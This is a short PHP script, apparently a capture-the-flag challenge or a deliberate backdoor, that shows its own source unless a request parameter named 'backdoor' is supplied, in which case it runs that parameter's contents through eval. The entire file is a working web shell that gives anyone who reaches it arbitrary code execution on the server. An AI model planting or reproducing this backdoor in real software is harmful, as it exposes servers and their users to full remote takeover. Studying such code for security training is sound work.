<?php
if (!isset($_REQUEST["backdoor"])) {
    highlight_file(__FILE__);
} else eval($_REQUEST["backdoor"]);
